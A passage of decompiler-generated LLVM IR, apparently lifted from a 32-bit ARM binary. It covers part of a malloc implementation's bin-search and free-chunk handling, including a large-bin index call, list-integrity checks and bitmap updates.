  br i1 %tmp208, label %dec_label_pc_10c40, label %dec_label_pc_10c24

dec_label_pc_10c24:                               ; preds = %dec_label_pc_10c1c
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r2.global-to-local, align 4
  %v1_10c28 = load i32, i32* %r8.global-to-local, align 4
  %v2_10c28 = add i32 %v1_10c28, ptrtoint (i32* @global_var_20d14.594 to i32)
  %v3_10c28 = inttoptr i32 %v2_10c28 to i32*
  %v4_10c28 = load i32, i32* %v3_10c28, align 4
  %v3_10c2c = udiv i32 %v0_10c1c, 8
  store i32 %v3_10c2c, i32* %r0.global-to-local, align 4
  %v4_10c30 = mul nuw i32 %v3_10c2c, 8
  %v5_10c30 = add i32 %v4_10c28, %v4_10c30
  store i32 %v5_10c30, i32* %r3.global-to-local, align 4
  %v1_10c34 = add i32 %v5_10c30, 44
  store i32 %v1_10c34, i32* %ip.global-to-local, align 4
  %v1_10c38 = add i32 %v5_10c30, 52
  %v2_10c38 = inttoptr i32 %v1_10c38 to i32*
  %v3_10c38 = load i32, i32* %v2_10c38, align 4
  store i32 %v3_10c38, i32* @lr, align 4
  br label %dec_label_pc_10c98

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10c1c
  store i32 %v0_10c1c, i32* %r0.global-to-local, align 4
  %v1_10c44 = call i32 @__malloc_largebin_index(i32 %v0_10c1c)
  store i32 %v1_10c44, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %ip.global-to-local, align 4
  %v1_10c4c = load i32, i32* %r8.global-to-local, align 4
  %v2_10c4c = add i32 %v1_10c4c, ptrtoint (i32* @global_var_20d14.594 to i32)
  %v3_10c4c = inttoptr i32 %v2_10c4c to i32*
  %v4_10c4c = load i32, i32* %v3_10c4c, align 4
  %v4_10c50 = mul i32 %v1_10c44, 8
  %v5_10c50 = add i32 %v4_10c4c, %v4_10c50
  store i32 %v5_10c50, i32* %r3.global-to-local, align 4
  %v1_10c54 = add i32 %v5_10c50, 44
  store i32 %v1_10c54, i32* %ip.global-to-local, align 4
  %v1_10c58 = add i32 %v5_10c50, 52
  %v2_10c58 = inttoptr i32 %v1_10c58 to i32*
  %v3_10c58 = load i32, i32* %v2_10c58, align 4
  store i32 %v3_10c58, i32* @lr, align 4
  %v9_10c5c = icmp eq i32 %v3_10c58, %v1_10c54
  br i1 %v9_10c5c, label %dec_label_pc_10c98, label %dec_label_pc_10c64

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c40
  %v1_10c64 = add i32 %v5_10c50, 56
  %v2_10c64 = inttoptr i32 %v1_10c64 to i32*
  %v3_10c64 = load i32, i32* %v2_10c64, align 4
  store i32 %v3_10c64, i32* %r1.global-to-local, align 4
  %v1_10c68 = add i32 %v3_10c64, 4
  %v2_10c68 = inttoptr i32 %v1_10c68 to i32*
  %v3_10c68 = load i32, i32* %v2_10c68, align 4
  store i32 %v3_10c68, i32* %r3.global-to-local, align 4
  %v0_10c6c = load i32, i32* %r4.global-to-local, align 4
  %v3_10c6c = icmp ult i32 %v0_10c6c, %v3_10c68
  br i1 %v3_10c6c, label %.thread, label %dec_label_pc_10c88.preheader

.thread:                                          ; preds = %dec_label_pc_10c64
  store i32 %v1_10c54, i32* @lr, align 4
  store i32 %v3_10c64, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10c98

dec_label_pc_10c88.preheader:                     ; preds = %dec_label_pc_10c64
  %v2_10c74 = or i32 %v0_10c6c, 1
  store i32 %v2_10c74, i32* %r2.global-to-local, align 4
  %v1_10c88182 = add i32 %v3_10c58, 4
  %v2_10c88183 = inttoptr i32 %v1_10c88182 to i32*
  %v3_10c88184 = load i32, i32* %v2_10c88183, align 4
  store i32 %v3_10c88184, i32* %r3.global-to-local, align 4
  %v3_10c8c186 = icmp ult i32 %v2_10c74, %v3_10c88184
  br i1 %v3_10c8c186, label %dec_label_pc_10c84, label %dec_label_pc_10c94

dec_label_pc_10c84:                               ; preds = %dec_label_pc_10c88.preheader, %dec_label_pc_10c84
  %v0_10c94187 = phi i32 [ %v3_10c84, %dec_label_pc_10c84 ], [ %v3_10c58, %dec_label_pc_10c88.preheader ]
  %v1_10c84 = add i32 %v0_10c94187, 8
  %v2_10c84 = inttoptr i32 %v1_10c84 to i32*
  %v3_10c84 = load i32, i32* %v2_10c84, align 4
  store i32 %v3_10c84, i32* @lr, align 4
  %v1_10c88 = add i32 %v3_10c84, 4
  %v2_10c88 = inttoptr i32 %v1_10c88 to i32*
  %v3_10c88 = load i32, i32* %v2_10c88, align 4
  store i32 %v3_10c88, i32* %r3.global-to-local, align 4
  %v3_10c8c = icmp ult i32 %v2_10c74, %v3_10c88
  br i1 %v3_10c8c, label %dec_label_pc_10c84, label %dec_label_pc_10c94

dec_label_pc_10c94:                               ; preds = %dec_label_pc_10c84, %dec_label_pc_10c88.preheader
  %v0_10c94.lcssa = phi i32 [ %v3_10c58, %dec_label_pc_10c88.preheader ], [ %v3_10c84, %dec_label_pc_10c84 ]
  %v1_10c94 = add i32 %v0_10c94.lcssa, 12
  %v2_10c94 = inttoptr i32 %v1_10c94 to i32*
  %v3_10c94 = load i32, i32* %v2_10c94, align 4
  store i32 %v3_10c94, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %.thread, %dec_label_pc_10c40, %dec_label_pc_10c24, %dec_label_pc_10c94
  %v0_10cb8 = phi i32 [ %v1_10c54, %dec_label_pc_10c40 ], [ %v1_10c34, %dec_label_pc_10c24 ], [ %v3_10c94, %dec_label_pc_10c94 ], [ %v3_10c64, %.thread ]
  %v0_10cac = phi i32 [ %v1_10c44, %dec_label_pc_10c40 ], [ %v3_10c2c, %dec_label_pc_10c24 ], [ %v1_10c44, %dec_label_pc_10c94 ], [ %v1_10c44, %.thread ]
  %v1_10c9c = phi i32 [ %v1_10c4c, %dec_label_pc_10c40 ], [ %v1_10c28, %dec_label_pc_10c24 ], [ %v1_10c4c, %dec_label_pc_10c94 ], [ %v1_10c4c, %.thread ]
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r2.global-to-local, align 4
  %v2_10c9c = add i32 %v1_10c9c, ptrtoint (i32* @global_var_20d14.594 to i32)
  %v3_10c9c = inttoptr i32 %v2_10c9c to i32*
  %v4_10c9c = load i32, i32* %v3_10c9c, align 4
  %v3_10ca0 = sdiv i32 %v0_10cac, 32
  store i32 %v3_10ca0, i32* %r3.global-to-local, align 4
  %v4_10ca4 = mul nsw i32 %v3_10ca0, 4
  %v5_10ca4 = add i32 %v4_10c9c, %v4_10ca4
  store i32 %v5_10ca4, i32* %r1.global-to-local, align 4
  %v1_10ca8 = add i32 %v5_10ca4, 820
  %v2_10ca8 = inttoptr i32 %v1_10ca8 to i32*
  %v3_10ca8 = load i32, i32* %v2_10ca8, align 4
  %v1_10cac = urem i32 %v0_10cac, 32
  store i32 %v1_10cac, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_10cb4 = shl i32 1, %v1_10cac
  %v8_10cb4 = or i32 %v3_10ca8, %v7_10cb4
  store i32 %v8_10cb4, i32* %r3.global-to-local, align 4
  %v1_10cb8 = load i32, i32* @r6, align 4
  %v2_10cb8 = add i32 %v1_10cb8, 12
  %v3_10cb8 = inttoptr i32 %v2_10cb8 to i32*
  store i32 %v0_10cb8, i32* %v3_10cb8, align 4
  %v0_10cbc = load i32, i32* @lr, align 4
  %v1_10cbc = load i32, i32* @r6, align 4
  %v2_10cbc = add i32 %v1_10cbc, 8
  %v3_10cbc = inttoptr i32 %v2_10cbc to i32*
  store i32 %v0_10cbc, i32* %v3_10cbc, align 4
  %v0_10cc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_10cc0 = load i32, i32* %r1.global-to-local, align 4
  %v2_10cc0 = add i32 %v1_10cc0, 820
  %v3_10cc0 = inttoptr i32 %v2_10cc0 to i32*
  store i32 %v0_10cc0, i32* %v3_10cc0, align 4
  %v0_10cc4 = load i32, i32* @r6, align 4
  %v1_10cc4 = load i32, i32* @lr, align 4
  %v2_10cc4 = add i32 %v1_10cc4, 12
  %v3_10cc4 = inttoptr i32 %v2_10cc4 to i32*
  store i32 %v0_10cc4, i32* %v3_10cc4, align 4
  %v0_10cc8 = load i32, i32* @r6, align 4
  %v1_10cc8 = load i32, i32* %ip.global-to-local, align 4
  %v2_10cc8 = add i32 %v1_10cc8, 8
  %v3_10cc8 = inttoptr i32 %v2_10cc8 to i32*
  store i32 %v0_10cc8, i32* %v3_10cc8, align 4
  %v0_10ce4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10ce4

dec_label_pc_10cd0:                               ; preds = %dec_label_pc_10b70, %dec_label_pc_10b28, %dec_label_pc_10b84
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r1.global-to-local, align 4
  %v4_10cd8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_10cd8, i32* @sb, align 4
  %v0_10cdc = load i32, i32* @sl, align 4
  %v1_10cdc = add i32 %v0_10cdc, 16
  store i32 %v1_10cdc, i32* @fp, align 4
  %v1_10ce0 = add i32 %v4_10cd8, 52
  store i32 %v1_10ce0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10ce4

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10c98, %dec_label_pc_10cd0
  %v0_10c04 = phi i32 [ %v0_10ce4.pre, %dec_label_pc_10c98 ], [ %v1_10ce0, %dec_label_pc_10cd0 ]
  %v1_10ce4 = add i32 %v0_10c04, 12
  %v2_10ce4 = inttoptr i32 %v1_10ce4 to i32*
  %v3_10ce4 = load i32, i32* %v2_10ce4, align 4
  store i32 %v3_10ce4, i32* @r6, align 4
  %v9_10ce8 = icmp eq i32 %v3_10ce4, %v0_10c04
  br i1 %v9_10ce8, label %dec_label_pc_10cf0, label %dec_label_pc_10b98

dec_label_pc_10cf0:                               ; preds = %dec_label_pc_10ce4
  %v0_10cf0 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_10cf0, 256
  %v0_10da8.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_10cf0.dec_label_pc_10da8_crit_edge, label %dec_label_pc_10cf8

dec_label_pc_10cf0.dec_label_pc_10da8_crit_edge:  ; preds = %dec_label_pc_10cf0
  %.pre203 = mul i32 %v0_10da8.pre, 8
  br label %dec_label_pc_10da8

dec_label_pc_10cf8:                               ; preds = %dec_label_pc_10cf0
  %v4_10cf8 = mul i32 %v0_10da8.pre, 8
  %v5_10cf8 = add i32 %v4_10cf8, %v0_10c04
  store i32 %v5_10cf8, i32* %r3.global-to-local, align 4
  %v1_10cfc = add i32 %v5_10cf8, -8
  store i32 %v1_10cfc, i32* %r1.global-to-local, align 4
  %v1_10d00 = add i32 %v5_10cf8, 4
  %v2_10d00 = inttoptr i32 %v1_10d00 to i32*
  %storemerge.pre = load i32, i32* %v2_10d00, align 4
  br label %dec_label_pc_10da0

dec_label_pc_10d08:                               ; preds = %dec_label_pc_10da0
  %v1_10d08 = add i32 %v1_10d30, 4
  %v2_10d08 = inttoptr i32 %v1_10d08 to i32*
  %v3_10d08 = load i32, i32* %v2_10d08, align 4
  store i32 %v3_10d08, i32* %r3.global-to-local, align 4
  %v1_10d0c = and i32 %v3_10d08, -4
  store i32 %v1_10d0c, i32* %r2.global-to-local, align 4
  %v3_10d10 = icmp ult i32 %v1_10d0c, %v0_10cf0
  %v1_10d14 = add i32 %v1_10d30, 12
  %v2_10d14 = inttoptr i32 %v1_10d14 to i32*
  %v3_10d14 = load i32, i32* %v2_10d14, align 4
  store i32 %v3_10d14, i32* %r0.global-to-local, align 4
  br i1 %v3_10d10, label %dec_label_pc_10da0, label %dec_label_pc_10d1c

dec_label_pc_10d1c:                               ; preds = %dec_label_pc_10d08
  %v1_10d1c = add i32 %v1_10d30, 8
  %v2_10d1c = inttoptr i32 %v1_10d1c to i32*
  %v3_10d1c = load i32, i32* %v2_10d1c, align 4
  store i32 %v3_10d1c, i32* %r1.global-to-local, align 4
  %v1_10d20 = add i32 %v3_10d1c, 12
  %v2_10d20 = inttoptr i32 %v1_10d20 to i32*
  %v3_10d20 = load i32, i32* %v2_10d20, align 4
  store i32 %v3_10d20, i32* %r3.global-to-local, align 4
  %v9_10d24 = icmp eq i32 %v3_10d20, %v1_10d30
  br i1 %v9_10d24, label %dec_label_pc_10d2c, label %dec_label_pc_10d38

dec_label_pc_10d2c:                               ; preds = %dec_label_pc_10d1c
  %v1_10d2c = add i32 %v3_10d14, 8
  %v2_10d2c = inttoptr i32 %v1_10d2c to i32*
  %v3_10d2c = load i32, i32* %v2_10d2c, align 4
  store i32 %v3_10d2c, i32* %r3.global-to-local, align 4
  %v9_10d30 = icmp eq i32 %v3_10d2c, %v1_10d30
  br i1 %v9_10d30, label %dec_label_pc_10d3c, label %dec_label_pc_10d38

dec_label_pc_10d38:                               ; preds = %dec_label_pc_10d1c, %dec_label_pc_10d2c
  %v0_10d38 = call i32 @abort()
  store i32 %v0_10d38, i32* %r0.global-to-local, align 4
  %v0_10d3c.pre = load i32, i32* @sl, align 4
  %v1_10d3c.pre = load i32, i32* @r2, align 4
  %v0_10d44.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_10d3c

dec_label_pc_10d3c:                               ; preds = %dec_label_pc_10d2c, %dec_label_pc_10d38
  %v1_10d44 = phi i32 [ %v3_10d14, %dec_label_pc_10d2c ], [ %v0_10d38, %dec_label_pc_10d38 ]
  %v0_10d44 = phi i32 [ %v3_10d1c, %dec_label_pc_10d2c ], [ %v0_10d44.pre, %dec_label_pc_10d38 ]
  %v1_10d3c = phi i32 [ %v1_10d0c, %dec_label_pc_10d2c ], [ %v1_10d3c.pre, %dec_label_pc_10d38 ]
  %v0_10d3c = phi i32 [ %v0_10cf0, %dec_label_pc_10d2c ], [ %v0_10d3c.pre, %dec_label_pc_10d38 ]
  %v2_10d3c = sub i32 %v1_10d3c, %v0_10d3c
  store i32 %v2_10d3c, i32* %lr.global-to-local, align 4
  %v2_10d44 = add i32 %v1_10d44, 8
  %v3_10d44 = inttoptr i32 %v2_10d44 to i32*
  store i32 %v0_10d44, i32* %v3_10d44, align 4
  %v0_10d48 = load i32, i32* %r0.global-to-local, align 4
  %v1_10d48 = load i32, i32* %r1.global-to-local, align 4
  %v2_10d48 = add i32 %v1_10d48, 12
  %v3_10d48 = inttoptr i32 %v2_10d48 to i32*
  store i32 %v0_10d48, i32* %v3_10d48, align 4
  %v0_10d4c = load i32, i32* %ip.global-to-local, align 4
  %v1_10d4c = add i32 %v0_10d4c, 8
  store i32 %v1_10d4c, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_10d3c, 15
  br i1 %tmp210, label %dec_label_pc_10d6c, label %dec_label_pc_10d54

dec_label_pc_10d54:                               ; preds = %dec_label_pc_10d3c
  %v1_10d54 = load i32, i32* %r2.global-to-local, align 4
  %v2_10d54 = add i32 %v1_10d54, %v0_10d4c
  store i32 %v2_10d54, i32* %r2.global-to-local, align 4
  %v1_10d58 = add i32 %v2_10d54, 4
  %v2_10d58 = inttoptr i32 %v1_10d58 to i32*
  %v3_10d58 = load i32, i32* %v2_10d58, align 4
  store i32 %v3_10d58, i32* %r3.global-to-local, align 4
  store i32 %v1_10d4c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10d60

dec_label_pc_10d60.loopexit:                      ; preds = %dec_label_pc_10c00
  %v1_10c0c = load i32, i32* @r6, align 4
  %v2_10c0c = load i32, i32* @sl, align 4
  %v3_10c0c = add i32 %v2_10c0c, %v1_10c0c
  store i32 %v3_10c0c, i32* %r2.global-to-local, align 4
  %v2_10c10 = add i32 %v3_10c0c, 4
  %v3_10c10 = inttoptr i32 %v2_10c10 to i32*
  %v4_10c10 = load i32, i32* %v3_10c10, align 4
  store i32 %v4_10c10, i32* %r3.global-to-local, align 4
  %v2_10c14 = add i32 %v1_10c0c, 8
  store i32 %v2_10c14, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10d60

dec_label_pc_10d60:                               ; preds = %.dec_label_pc_10d60_crit_edge, %dec_label_pc_10d60.loopexit, %dec_label_pc_10d54
  %v1_10d64 = phi i32 [ %v4_10e88, %.dec_label_pc_10d60_crit_edge ], [ %v3_10c0c, %dec_label_pc_10d60.loopexit ], [ %v2_10d54, %dec_label_pc_10d54 ]
  %v0_10d60 = phi i32 [ %v7_10e88, %.dec_label_pc_10d60_crit_edge ], [ %v4_10c10, %dec_label_pc_10d60.loopexit ], [ %v3_10d58, %dec_label_pc_10d54 ]
  %v1_10d60 = or i32 %v0_10d60, 1
  store i32 %v1_10d60, i32* %r3.global-to-local, align 4
  %v2_10d64 = add i32 %v1_10d64, 4
  %v3_10d64 = inttoptr i32 %v2_10d64 to i32*
  store i32 %v1_10d60, i32* %v3_10d64, align 4
  br label %dec_label_pc_11328

dec_label_pc_10d6c:                               ; preds = %dec_label_pc_10d3c
  %v1_10d6c = load i32, i32* @sl, align 4
  %v2_10d6c = add i32 %v1_10d6c, %v0_10d4c
  store i32 %v2_10d6c, i32* %r2.global-to-local, align 4
  %v1_10d70 = or i32 %v1_10d6c, 1
  store i32 %v1_10d70, i32* %r3.global-to-local, align 4
  %v0_10d74 = load i32, i32* %lr.global-to-local, align 4
  %v1_10d74 = or i32 %v0_10d74, 1
  store i32 %v1_10d74, i32* %r1.global-to-local, align 4
  store i32 %v1_10d4c, i32* %r4.global-to-local, align 4
  %v2_10d7c = add i32 %v0_10d4c, 4
  %v3_10d7c = inttoptr i32 %v2_10d7c to i32*
  store i32 %v1_10d70, i32* %v3_10d7c, align 4
  %v0_10d80 = load i32, i32* %r2.global-to-local, align 4
  %v1_10d80 = load i32, i32* @r6, align 4
  %v2_10d80 = add i32 %v1_10d80, 8
  %v3_10d80 = inttoptr i32 %v2_10d80 to i32*
  store i32 %v0_10d80, i32* %v3_10d80, align 4
  %v0_10d84 = load i32, i32* %r2.global-to-local, align 4
  %v1_10d84 = load i32, i32* @r6, align 4
  %v2_10d84 = add i32 %v1_10d84, 12
  %v3_10d84 = inttoptr i32 %v2_10d84 to i32*
  store i32 %v0_10d84, i32* %v3_10d84, align 4
  %v0_10d88 = load i32, i32* %lr.global-to-local, align 4
  %v1_10d88 = load i32, i32* %r2.global-to-local, align 4
  %v3_10d88 = add i32 %v1_10d88, %v0_10d88
  %v4_10d88 = inttoptr i32 %v3_10d88 to i32*
  store i32 %v0_10d88, i32* %v4_10d88, align 4
  %v0_10d8c = load i32, i32* %r1.global-to-local, align 4
  %v1_10d8c = load i32, i32* %r2.global-to-local, align 4
  %v2_10d8c = add i32 %v1_10d8c, 4
  %v3_10d8c = inttoptr i32 %v2_10d8c to i32*
  store i32 %v0_10d8c, i32* %v3_10d8c, align 4
  %v0_10d90 = load i32, i32* @r6, align 4
  %v1_10d90 = load i32, i32* %r2.global-to-local, align 4
  %v2_10d90 = add i32 %v1_10d90, 12
  %v3_10d90 = inttoptr i32 %v2_10d90 to i32*
  store i32 %v0_10d90, i32* %v3_10d90, align 4
  %v0_10d94 = load i32, i32* @r6, align 4
  %v1_10d94 = load i32, i32* %r2.global-to-local, align 4
  %v2_10d94 = add i32 %v1_10d94, 8
  %v3_10d94 = inttoptr i32 %v2_10d94 to i32*
  store i32 %v0_10d94, i32* %v3_10d94, align 4
  br label %dec_label_pc_11328

dec_label_pc_10da0:                               ; preds = %dec_label_pc_10d08, %dec_label_pc_10cf8
  %v1_10d30 = phi i32 [ %storemerge.pre, %dec_label_pc_10cf8 ], [ %v3_10d14, %dec_label_pc_10d08 ]
  store i32 %v1_10d30, i32* %ip.global-to-local, align 4
  %v9_10da0 = icmp eq i32 %v1_10d30, %v1_10cfc
  br i1 %v9_10da0, label %dec_label_pc_10da8.loopexit, label %dec_label_pc_10d08

dec_label_pc_10da8.loopexit:                      ; preds = %dec_label_pc_10da0
  br label %dec_label_pc_10da8

dec_label_pc_10da8:                               ; preds = %dec_label_pc_10cf0.dec_label_pc_10da8_crit_edge, %dec_label_pc_10da8.loopexit
  %v4_10dd8.pre-phi = phi i32 [ %.pre203, %dec_label_pc_10cf0.dec_label_pc_10da8_crit_edge ], [ %v4_10cf8, %dec_label_pc_10da8.loopexit ]
  %v1_10da8 = add i32 %v0_10da8.pre, 1
  store i32 %v1_10da8, i32* %r2.global-to-local, align 4
  %v1_10dac = urem i32 %v1_10da8, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r0.global-to-local, align 4
  %v6_10db8 = shl i32 1, %v1_10dac
  store i32 %v6_10db8, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_10dc0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_10dc0, i32* %r3.global-to-local, align 4
  %v3_10dc4 = udiv i32 %v1_10da8, 32
  store i32 %v3_10dc4, i32* @r5, align 4
  %v4_10dc8 = mul nuw nsw i32 %v3_10dc4, 4
  %v5_10dc8 = add i32 %v4_10dc0, %v4_10dc8
  store i32 %v5_10dc8, i32* %r2.global-to-local, align 4
  %v1_10dcc = add i32 %v5_10dc8, 820
  %v2_10dcc = inttoptr i32 %v1_10dcc to i32*
  %v3_10dcc = load i32, i32* %v2_10dcc, align 4
  store i32 %v3_10dcc, i32* @r4, align 4
  %v1_10dd0 = add i32 %v4_10dc0, 52
  store i32 %v1_10dd0, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_10dd8 = add i32 %v1_10dd0, %v4_10dd8.pre-phi
  store i32 %v5_10dd8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ddc

dec_label_pc_10ddc:                               ; preds = %dec_label_pc_10e44, %dec_label_pc_10da8
  %v1_10de4 = phi i32 [ %v1_10de4.pre, %dec_label_pc_10e44 ], [ %v3_10dcc, %dec_label_pc_10da8 ]
  %v0_10de4 = phi i32 [ %v0_10ddc.pre, %dec_label_pc_10e44 ], [ %v6_10db8, %dec_label_pc_10da8 ]
  %v1_10ddc = sub i32 1, %v0_10de4
  %v2_10ddc = icmp ult i32 %v0_10de4, 2
  %v1_10ddc. = select i1 %v2_10ddc, i32 %v1_10ddc, i32 0
  store i32 %v1_10ddc., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_10de4, %v1_10de4
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_10ddc
  %v5_10de8 = or i32 %v1_10ddc., 1
  store i32 %v5_10de8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10df4.preheader

bb145:                                            ; preds = %dec_label_pc_10ddc
  %v2_10dec = icmp eq i32 %v1_10ddc., 0
  br i1 %v2_10dec, label %.dec_label_pc_10e30.preheader_crit_edge, label %dec_label_pc_10df4.preheader

.dec_label_pc_10e30.preheader_crit_edge:          ; preds = %bb145
  %v0_10e2857.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e30.preheader

dec_label_pc_10df4.preheader:                     ; preds = %bb145, %.thread15
  %v0_10df4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10df4

dec_label_pc_10df4:                               ; preds = %dec_label_pc_10df4.preheader, %dec_label_pc_10e00
  %v0_10df4 = phi i32 [ %v0_10df4.pre, %dec_label_pc_10df4.preheader ], [ %v1_10df4, %dec_label_pc_10e00 ]
  %v1_10df4 = add i32 %v0_10df4, 1
  store i32 %v1_10df4, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_10df4, 2
  br i1 %tmp211, label %dec_label_pc_10ed4.loopexit, label %dec_label_pc_10e00

dec_label_pc_10e00:                               ; preds = %dec_label_pc_10df4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r3.global-to-local, align 4
  %v1_10e04 = load i32, i32* @r8, align 4
  %v2_10e04 = add i32 %v1_10e04, ptrtoint (i32* @global_var_20d14.594 to i32)
  %v3_10e04 = inttoptr i32 %v2_10e04 to i32*
  %v4_10e04 = load i32, i32* %v3_10e04, align 4
  store i32 %v4_10e04, i32* %r2.global-to-local, align 4
  %v4_10e08 = mul i32 %v1_10df4, 4
  %v5_10e08 = add i32 %v4_10e04, %v4_10e08
  store i32 %v5_10e08, i32* %r3.global-to-local, align 4
  %v1_10e0c = add i32 %v5_10e08, 820
  %v2_10e0c = inttoptr i32 %v1_10e0c to i32*
  %v3_10e0c = load i32, i32* %v2_10e0c, align 4
  store i32 %v3_10e0c, i32* @r4, align 4
  %v2_10e10 = icmp eq i32 %v3_10e0c, 0
  br i1 %v2_10e10, label %dec_label_pc_10df4, label %dec_label_pc_10e18

dec_label_pc_10e18:                               ; preds = %dec_label_pc_10e00
  %v4_10e18 = mul i32 %v1_10df4, 256
  %v5_10e18 = add i32 %v4_10e04, %v4_10e18
  store i32 %v5_10e18, i32* %r3.global-to-local, align 4
  %v1_10e1c = add i32 %v5_10e18, 44
  store i32 %v1_10e1c, i32* %r0.global-to-local, align 4
  %v0_10e20 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10e20, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10e30.preheader

dec_label_pc_10e30.preheader:                     ; preds = %.dec_label_pc_10e30.preheader_crit_edge, %dec_label_pc_10e18
  %v0_10e2857 = phi i32 [ %v1_10e1c, %dec_label_pc_10e18 ], [ %v0_10e2857.pre, %.dec_label_pc_10e30.preheader_crit_edge ]
  %v0_10e4c = phi i32 [ %v3_10e0c, %dec_label_pc_10e18 ], [ %v1_10de4, %.dec_label_pc_10e30.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_10e20, %dec_label_pc_10e18 ], [ %v0_10de4, %.dec_label_pc_10e30.preheader_crit_edge ]
  %v2_10e3054 = and i32 %ip.promoted, %v0_10e4c
  %v4_10e3056 = icmp eq i32 %v2_10e3054, 0
  br i1 %v4_10e3056, label %dec_label_pc_10e28, label %dec_label_pc_10e38

dec_label_pc_10e28:                               ; preds = %dec_label_pc_10e30.preheader, %dec_label_pc_10e28
  %v2_10e2c59 = phi i32 [ %v2_10e2c, %dec_label_pc_10e28 ], [ %ip.promoted, %dec_label_pc_10e30.preheader ]
  %v0_10e2858 = phi i32 [ %v1_10e28, %dec_label_pc_10e28 ], [ %v0_10e2857, %dec_label_pc_10e30.preheader ]
  %v1_10e28 = add i32 %v0_10e2858, 8
  %v2_10e2c = mul i32 %v2_10e2c59, 2
  %v2_10e30 = and i32 %v2_10e2c, %v0_10e4c
  %v4_10e30 = icmp eq i32 %v2_10e30, 0
  br i1 %v4_10e30, label %dec_label_pc_10e28, label %dec_label_pc_10e30.dec_label_pc_10e38_crit_edge

dec_label_pc_10e30.dec_label_pc_10e38_crit_edge:  ; preds = %dec_label_pc_10e28
  store i32 %v1_10e28, i32* %r0.global-to-local, align 4
  store i32 %v2_10e2c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10e38

dec_label_pc_10e38:                               ; preds = %dec_label_pc_10e30.dec_label_pc_10e38_crit_edge, %dec_label_pc_10e30.preheader
  %v0_10e58 = phi i32 [ %v2_10e2c, %dec_label_pc_10e30.dec_label_pc_10e38_crit_edge ], [ %ip.promoted, %dec_label_pc_10e30.preheader ]
  %v0_10e7c = phi i32 [ %v1_10e28, %dec_label_pc_10e30.dec_label_pc_10e38_crit_edge ], [ %v0_10e2857, %dec_label_pc_10e30.preheader ]
  %v1_10e38 = add i32 %v0_10e7c, 12
  %v2_10e38 = inttoptr i32 %v1_10e38 to i32*
  %v3_10e38 = load i32, i32* %v2_10e38, align 4
  store i32 %v3_10e38, i32* @lr, align 4
  %v9_10e3c = icmp eq i32 %v3_10e38, %v0_10e7c
  br i1 %v9_10e3c, label %dec_label_pc_10e44, label %dec_label_pc_10e64

dec_label_pc_10e44:                               ; preds = %dec_label_pc_10e38
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r0.global-to-local, align 4
  %v1_10e48 = load i32, i32* @r8, align 4
  %v2_10e48 = add i32 %v1_10e48, ptrtoint (i32* @global_var_20d14.594 to i32)
  %v3_10e48 = inttoptr i32 %v2_10e48 to i32*
  %v4_10e48 = load i32, i32* %v3_10e48, align 4
  %v2_10e4c = sub i32 -1, %v0_10e58
  %v3_10e4c = and i32 %v0_10e4c, %v2_10e4c
  store i32 %v3_10e4c, i32* @r4, align 4
  %v1_10e50 = load i32, i32* @r5, align 4
  %v4_10e50 = mul i32 %v1_10e50, 4
  %v5_10e50 = add i32 %v4_10e50, %v4_10e48
  store i32 %v5_10e50, i32* %r3.global-to-local, align 4
  %v1_10e54 = add i32 %v0_10e7c, 8
  store i32 %v1_10e54, i32* %r0.global-to-local, align 4
  %v2_10e58 = mul i32 %v0_10e58, 2
  store i32 %v2_10e58, i32* %ip.global-to-local, align 4
  %v2_10e5c = add i32 %v5_10e50, 820
  %v3_10e5c = inttoptr i32 %v2_10e5c to i32*
  store i32 %v3_10e4c, i32* %v3_10e5c, align 4
  %v0_10ddc.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_10de4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10ddc

dec_label_pc_10e64:                               ; preds = %dec_label_pc_10e38
  %v1_10e64 = add i32 %v3_10e38, 4
  %v2_10e64 = inttoptr i32 %v1_10e64 to i32*
  %v3_10e64 = load i32, i32* %v2_10e64, align 4
  store i32 %v3_10e64, i32* %r3.global-to-local, align 4
  %v1_10e68 = and i32 %v3_10e64, -4
